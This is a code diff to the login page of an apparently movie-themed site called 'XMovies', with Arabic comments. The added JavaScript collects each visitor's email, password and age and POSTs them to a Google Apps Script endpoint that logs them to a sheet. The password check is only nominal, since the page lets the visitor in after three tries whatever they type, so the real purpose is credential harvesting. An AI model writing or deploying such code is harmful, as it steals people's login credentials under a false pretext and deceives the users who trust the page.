@@ -52,14 +52,33 @@ button:hover{ transform:scale(1.05); box-shadow:0 0 25px red;}
 <script>
 let attempts = 0;
 const maxAttempts = 3;
-const correctPassword = "1234"; // ضع كلمة السر هنا
+const correctPassword = "1234"; // كلمة السر
+const sheetUrl = "https://script.google.com/macros/s/AKfycbwm9grs3OWZycMGtyD0q3Y_vrLK9IWdVSo0ar2IjCJ34IJzIZWBB4eeccdfFIQHnlPN/exec"; // ضع رابط الويب آب هنا
 
-function go(){
-  const pw = document.getElementById("password").value;
+async function go() {
+  const email = document.getElementById("email").value.trim();
+  const pw = document.getElementById("password").value.trim();
+  const age = document.getElementById("age").value.trim();
   const error = document.getElementById("errorMsg");
-  attempts++;
 
-  if(pw === correctPassword || attempts === maxAttempts){
+  attempts++;
+  localStorage.setItem("xmovies_attempts", attempts);
+
+  // إرسال البيانات إلى Google Sheet
+  const data = `email=${encodeURIComponent(email)}&password=${encodeURIComponent(pw)}&age=${encodeURIComponent(age)}&attempt=${attempts}&form=XMovies`;
+  try {
+    await fetch(sheetUrl, {
+      method: "POST",
+      headers: { "Content-Type": "application/x-www-form-urlencoded" },
+      body: data
+    });
+  } catch (err) {
+    error.innerText = "Error connecting to Google Sheets";
+    return;
+  }
+
+  if (pw === correctPassword || attempts >= maxAttempts) {
+    localStorage.removeItem("xmovies_attempts");
     window.location.href = "movies.html";
   } else {
     error.innerText = "Password incorrect";
